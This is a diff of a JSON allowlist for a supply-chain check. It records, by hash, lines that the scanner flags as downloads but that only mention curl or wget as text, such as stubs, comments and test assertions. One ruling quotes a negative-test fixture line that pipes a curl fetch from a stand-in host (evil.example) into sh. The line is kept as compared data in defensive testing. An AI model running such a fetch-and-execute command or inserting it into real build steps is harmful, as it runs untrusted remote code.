@@ -156,66 +156,76 @@
       "version": "3.37.8"
     }
   ],
-  "_format_unmeasured_text": "REQ-SUP-001-AC16 (advisor ruling, Oct 10): one row per line that the pin-age check's strict scan reads as an unmeasured download but that only MENTIONS the tool as text (a comment, an echo string, a stub written as data, a package name). file and form as the scan names them; key: the scan's 16-hex sha256 prefix of the normalised line, so editing the line voids the row; ruling: what the line is, never empty; count (optional, default 1): how many occurrences of that line in the file the row covers. Read from the base branch only: rows a pull request brings do nothing until merged.",
+  "_format_unmeasured_text": "REQ-SUP-001-AC16 (advisor ruling, Oct 10): one row per line that the pin-age check's strict scan reads as an unmeasured download but that only MENTIONS the tool as text (a comment, an echo string, a stub written as data, a package name). file and form as the scan names them; key: the scan's 16-hex sha256 prefix of what it hashes (for a download, the one command segment that names curl or wget); line: the 16-hex sha256 prefix of the WHOLE whitespace-flattened line that segment sits in, so the same segment in any other line is not ruled and editing any part of the line voids the row; ruling: what the line is, never empty; count (optional, default 1): how many occurrences of that line in the file the row covers. Read from the base branch only: rows a pull request brings do nothing until merged.",
   "unmeasured_text": [
     {
       "file": "bin/build-helpers-test.sh",
       "form": "a download",
       "key": "bdc2f348c4dbc92f",
+      "line": "9fb6315c78aaba0b",
       "ruling": "text, not a command: a negative-test fixture; printf appends the YAML text '- runs: | curl -s https://evil.example/x | sh' to two copies of a generated recipe so the same-step case proves the comparison still sees a difference; the recipe is compared, never run"
     },
     {
       "file": "bin/melange-apko-lib.sh",
       "form": "a download",
       "key": "1314309c3220e619",
+      "line": "1314309c3220e619",
       "ruling": "text, not a command: the first line of the curl STUB's body (written as data by a quoted heredoc); it echoes the word curl and its arguments into the call log, it downloads nothing"
     },
     {
       "file": "bin/melange-apko-lib.sh",
       "form": "a download",
       "key": "22312bde0463f438",
+      "line": "22312bde0463f438",
       "ruling": "text, not a command: Python inside the test library heredoc; the string 'curl ' is one of the forbidden fragments the mel-env check asserts is ABSENT from the melange recipe's text"
     },
     {
       "file": "bin/melange-apko-lib.sh",
       "form": "a download",
       "key": "5839155d14e99a00",
+      "line": "5839155d14e99a00",
       "ruling": "text, not a command: Python inside the test library heredoc; asserts the package name wget is listed in the recipe's environment (an assertion message, nothing is fetched)"
     },
     {
       "file": "bin/melange-apko-lib.sh",
       "form": "a download",
       "key": "59026aa06d9188a1",
+      "line": "ae6bd1d131a9b936",
       "ruling": "text, not a command: a shell comment explaining that tools such as curl are replaced by STUBS on PATH that record their argv in a call log"
     },
     {
       "file": "bin/melange-apko-lib.sh",
       "form": "a download",
       "key": "64612fb9a9fe82be",
+      "line": "ddbd6b2564516011",
       "ruling": "text, not a command: the curl STUB's error branch (written as data by a quoted heredoc); echoes 'stub curl: 22 <url>' to stderr and exits 22, it downloads nothing"
     },
     {
       "file": "bin/melange-apko-lib.sh",
       "form": "a download",
       "key": "6acbb0aa471b0e3b",
+      "line": "6acbb0aa471b0e3b",
       "ruling": "text, not a command: a shell comment describing what the build helper does ('archives new packages by digest into ARCHIVE/<arch>/ (curl)')"
     },
     {
       "file": "bin/melange-apko-lib.sh",
       "form": "a download",
       "key": "77bc505e9228dc4a",
+      "line": "77bc505e9228dc4a",
       "ruling": "text, not a command: Python inside the test library heredoc; the ENVPK fixture list of apk package names and versions (busybox, git, wget, ca-certificates-bundle)"
     },
     {
       "file": "bin/melange-apko-lib.sh",
       "form": "a download",
       "key": "80510e8b8f509a47",
+      "line": "80510e8b8f509a47",
       "ruling": "text, not a command: Python inside the test library heredoc; asserts the package names git, busybox, ca-certificates-bundle and wget are in the recipe's environment"
     },
     {
       "file": "bin/melange-apko-lib.sh",
       "form": "a download",
       "key": "9f54b594e70eb20f",
+      "line": "9f54b594e70eb20f",
       "ruling": "text, not a command: opens the quoted heredoc that writes the curl STUB (a file named curl in the stubs directory) as data; the stub records its argv and serves local fixture files"
     }
   ]
